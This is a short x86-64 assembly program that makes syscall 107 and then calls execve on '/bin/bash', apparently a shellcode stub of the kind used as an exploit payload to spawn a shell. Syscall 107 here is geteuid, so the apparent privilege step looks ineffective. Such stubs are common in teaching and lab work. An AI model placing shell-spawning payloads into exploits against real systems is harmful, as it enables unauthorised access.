.section .text
.globl _start
_start:
 xor %rdi,%rdi
 xor %rsi,%rsi
 mov $107,%rax
 syscall
 mov $59,%rax
 lea bash(%rip),%rdi
 xor %rsi,%rsi
 xor %rdx,%rdx
 syscall
bash:
 .string "/bin/bash"
